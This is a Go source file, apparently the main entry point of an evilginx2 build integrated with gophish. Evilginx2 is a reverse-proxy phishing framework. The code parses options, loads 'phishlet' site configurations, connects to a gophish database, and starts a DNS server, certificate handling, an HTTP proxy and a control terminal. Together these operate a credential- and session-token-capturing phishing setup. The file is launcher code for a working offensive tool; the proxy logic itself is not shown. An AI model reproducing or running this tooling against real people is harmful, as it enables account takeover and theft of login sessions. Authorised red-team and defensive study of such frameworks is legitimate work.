package main

import (
    "flag"
    "io/ioutil"
    "os"
    "os/user"
    "path/filepath"
    "regexp"
    "strings"

    "github.com/kgretzky/evilginx2/core"
    "github.com/kgretzky/evilginx2/database"
    "github.com/kgretzky/evilginx2/log"
)

var phishlets_dir = flag.String("p", "", "Phishlets directory path")
var templates_dir = flag.String("t", "", "HTML templates directory path")
var debug_log = flag.Bool("debug", false, "Enable debug output")
var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
var cfg_dir = flag.String("c", "", "Configuration directory path")
var gophish_db = flag.String("g", "", "Full path to gophish database")
var feed_enabled = flag.Bool("feed", false, "Enable live feed")
var recaptcha = flag.String("captcha", "", "Recaptcha public/private key seperated by \":\"")
var turnstile = flag.String("turnstile", "", "Turnstile public/private key separated by \":\"")

func joinPath(base_path string, rel_path string) string {
    var ret string
    if filepath.IsAbs(rel_path) {
        ret = rel_path
    } else {
        ret = filepath.Join(base_path, rel_path)
    }
    return ret
}

func main() {
    exe_path, _ := os.Executable()
    exe_dir := filepath.Dir(exe_path)

    core.Banner()
    flag.Parse()
    if *gophish_db == "" {
        log.Fatal("you need to provide the full path to the gophish database: ./evilginx2 -g /opt/evilgophish/gophish/gophish.db")
        return
    }
    if *phishlets_dir == "" {
        *phishlets_dir = joinPath(exe_dir, "./phishlets")
        if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
            *phishlets_dir = "/usr/share/evilginx/phishlets/"
            if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
                log.Fatal("you need to provide the path to directory where your phishlets are stored: ./evilginx -p <phishlets_path>")
                return
            }
        }
    }
    if *templates_dir == "" {
        *templates_dir = joinPath(exe_dir, "./templates")
        if _, err := os.Stat(*templates_dir); os.IsNotExist(err) {
            *templates_dir = "/usr/share/evilginx/templates/"
            if _, err := os.Stat(*templates_dir); os.IsNotExist(err) {
                *templates_dir = joinPath(exe_dir, "./templates")
            }
        }
    }
    if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
        log.Fatal("provided phishlets directory path does not exist: %s", *phishlets_dir)
        return
    }
    if _, err := os.Stat(*templates_dir); os.IsNotExist(err) {
        os.MkdirAll(*templates_dir, os.FileMode(0700))
    }

    log.DebugEnable(*debug_log)
    if *debug_log {
        log.Info("debug output enabled")
    }

    phishlets_path := *phishlets_dir
    log.Info("loading phishlets from: %s", phishlets_path)

    if *cfg_dir == "" {
        usr, err := user.Current()
        if err != nil {
            log.Fatal("%v", err)
            return
        }
        *cfg_dir = filepath.Join(usr.HomeDir, ".evilginx")
    }

    config_path := *cfg_dir
    log.Info("loading configuration from: %s", config_path)

    err := os.MkdirAll(*cfg_dir, os.FileMode(0700))
    if err != nil {
        log.Fatal("%v", err)
        return
    }

    crt_path := joinPath(*cfg_dir, "./crt")

    if err := core.CreateDir(crt_path, 0700); err != nil {
        log.Fatal("mkdir: %v", err)
        return
    }

    cfg, err := core.NewConfig(*cfg_dir, "")
    if err != nil {
        log.Fatal("config: %v", err)
        return
    }
    cfg.SetTemplatesDir(*templates_dir)

    db, err := database.NewDatabase(filepath.Join(*cfg_dir, "data.db"))
    if err != nil {
        log.Fatal("database: %v", err)
        return
    }

    err = database.SetupGPDB(*gophish_db)
    if err != nil {
        log.Fatal("database: %v", err)
        return
    }

    bl, err := core.NewBlacklist(filepath.Join(*cfg_dir, "blacklist.txt"))
    if err != nil {
        log.Error("blacklist: %s", err)
        return
    }

    files, err := ioutil.ReadDir(phishlets_path)
    if err != nil {
        log.Fatal("failed to list phishlets directory '%s': %v", phishlets_path, err)
        return
    }
    for _, f := range files {
        if !f.IsDir() {
            pr := regexp.MustCompile(`([a-zA-Z0-9\-\.]*)\.yaml`)
            rpname := pr.FindStringSubmatch(f.Name())
            if rpname == nil || len(rpname) < 2 {
                continue
            }
            pname := rpname[1]
            if pname != "" {
                pl, err := core.NewPhishlet(pname, filepath.Join(phishlets_path, f.Name()), cfg)
                if err != nil {
                    log.Error("failed to load phishlet '%s': %v", f.Name(), err)
                    continue
                }
                //log.Info("loaded phishlet '%s' made by %s from '%s'", pl.Name, pl.Author, f.Name())
                cfg.AddPhishlet(pname, pl)
            }
        }
    }

    ns, _ := core.NewNameserver(cfg)
    ns.Start()
    var hs *core.HttpServer
    var hp *core.HttpProxy
    var crt_db *core.CertDb
    if *recaptcha != "" {
        sep := strings.Split(*recaptcha, ":")
        hs, _ = core.NewHttpServer(sep[0], sep[1], "", "", true, false)        
        crt_db, err = core.NewCertDb(crt_path, cfg, ns, hs)
        if err != nil {
            log.Fatal("certdb: %v", err)
            return
        }
        hp, _ = core.NewHttpProxy("127.0.0.1", 8443, cfg, crt_db, db, bl, *developer_mode, *feed_enabled, true, false)
    } else if *turnstile != "" { 
        sep := strings.Split(*turnstile, ":")
        hs, _ = core.NewHttpServer("", "", sep[0], sep[1], false, true)        
        crt_db, err = core.NewCertDb(crt_path, cfg, ns, hs)
        if err != nil {
            log.Fatal("certdb: %v", err)
            return
        }
        hp, _ = core.NewHttpProxy("127.0.0.1", 8443, cfg, crt_db, db, bl, *developer_mode, *feed_enabled, false, true)
    } else {
        hs, _ = core.NewHttpServer("", "", "", "", false, false)
        crt_db, err = core.NewCertDb(crt_path, cfg, ns, hs)
        if err != nil {
            log.Fatal("certdb: %v", err)
            return
        }
        hp, _ = core.NewHttpProxy("127.0.0.1", 8443, cfg, crt_db, db, bl, *developer_mode, *feed_enabled, false, false)
    }
    hs.Start(hp)
    hp.Start()

    t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
    if err != nil {
        log.Fatal("%v", err)
        return
    }

    t.DoWork()
}
